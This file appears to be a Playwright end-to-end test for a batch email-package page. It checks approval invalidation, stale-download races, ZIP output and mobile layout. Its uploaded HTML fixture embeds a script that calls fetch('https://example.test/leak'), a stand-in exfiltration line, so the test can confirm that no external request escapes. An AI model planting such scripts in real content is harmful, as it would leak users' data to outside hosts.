import assert from 'node:assert/strict';
import {readFile, mkdir} from 'node:fs/promises';
const {chromium} = await import(process.env.CCAA_PLAYWRIGHT_MODULE || 'playwright');
const base = process.env.CCAA_TEST_URL;
const evidence = process.env.CCAA_EVIDENCE;
await mkdir(evidence, {recursive: true});
const browser = await chromium.launch({headless: true,
  executablePath: process.env.AGENT_BROWSER_EXECUTABLE_PATH || '/opt/hermes/tools/chromium-1208/chrome-linux64/chrome'});
try {
  const context = await browser.newContext({acceptDownloads: true, viewport: {width: 1440, height: 1050}});
  const page = await context.newPage();
  const errors = [], external = [];
  page.on('pageerror', error => errors.push(error.message));
  page.on('request', request => {
    if (/^https?:/.test(request.url()) && new URL(request.url()).origin !== base) external.push(request.url());
  });
  await page.goto(base + '/fast-track-infra-2026');
  await page.locator('#batch-open').click();
  assert.equal(page.url(), base + '/fast-track-infra-2026/lote');
  assert.equal(await page.locator('#batch-form').count(), 1, 'separate batch preparation page exists');
  await page.locator('#batch-html').setInputFiles({name: 'aprovado.html', mimeType: 'text/html',
    buffer: Buffer.from('<!doctype html><meta charset="utf-8"><body><h1>HTML aprovado — QA</h1><script>fetch("https://example.test/leak")</script></body>')});
  let releaseImport, importFetched;
  const importGate = new Promise(resolve => { releaseImport = resolve; });
  const importWaiting = new Promise(resolve => { importFetched = resolve; });
  await page.route('**/api/lote/importar', async route => {
    const response = await route.fetch();
    importFetched();
    await importGate;
    await route.fulfill({response});
  });
  await page.locator('#batch-xlsx').setInputFiles(process.env.CCAA_LOTE_XLSX);
  await importWaiting;
  await page.locator('#batch-approved').check();
  releaseImport();
  await page.locator('[data-row]').first().waitFor();
  assert.equal(await page.locator('#batch-approved').isChecked(), false, 'unseen uploaded rows cannot inherit approval');
  await page.unroute('**/api/lote/importar');
  assert.equal(await page.locator('[data-row]').count(), 2);
  assert.equal(await page.locator('[data-field=selecionado]').first().isChecked(), true);
  assert.equal(await page.locator('[data-field=selecionado]').nth(1).isChecked(), false);
  await page.locator('#batch-subject').fill('Teste QA');
  await page.locator('[data-field=cc]').first().fill('copia@example.test');
  await page.locator('#batch-preview-button').click();
  await page.waitForFunction(() => document.querySelector('#batch-preview').getAttribute('src')?.startsWith('/api/preview/'));
  await page.locator('#batch-approved').check();
  let release, fetched;
  const gate = new Promise(resolve => { release = resolve; });
  const intercepted = new Promise(resolve => { fetched = resolve; });
  await page.route('**/api/lote/pacote', async route => {
    const response = await route.fetch();
    fetched();
    await gate;
    await route.fulfill({response});
  });
  const staleDownloads = [];
  const trackStale = download => staleDownloads.push(download.suggestedFilename());
  page.on('download', trackStale);
  await page.locator('#batch-build').click();
  await intercepted;
  await page.locator('#batch-subject').fill('Assunto revisado QA');
  const staleFinished = page.waitForEvent('requestfinished', request => request.url().endsWith('/api/lote/pacote'));
  release();
  await staleFinished;
  await page.evaluate(() => new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve))));
  assert.deepEqual(staleDownloads, [], 'stale package response cannot trigger download');
  assert.equal(await page.locator('#batch-approved').isChecked(), false);
  page.off('download', trackStale);
  await page.unroute('**/api/lote/pacote');
  await page.locator('#batch-approved').check();
  const downloadPromise = page.waitForEvent('download');
  await page.locator('#batch-build').click();
  const download = await downloadPromise;
  await download.saveAs(evidence + '/lote.zip');
  assert.ok((await readFile(evidence + '/lote.zip')).length > 1000);
  await page.waitForFunction(() => document.querySelector('#status').textContent.includes('Pacote baixado'));
  await page.locator('[data-field=para]').first().fill('alterado@example.test');
  assert.equal(await page.locator('#batch-approved').isChecked(), false, 'edits invalidate approval');
  await page.screenshot({path: evidence + '/lote-desktop.png', fullPage: true});
  await page.setViewportSize({width: 390, height: 844});
  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true, 'mobile does not overflow');
  await page.screenshot({path: evidence + '/lote-mobile.png', fullPage: true});
  assert.deepEqual(errors, []);
  assert.deepEqual(external, []);
  await browser.close();
  console.log(JSON.stringify({result: 'PASS', rows: 2, screenshots: ['lote-desktop.png', 'lote-mobile.png'], errors, external}));
} finally {
  await browser.close();
}
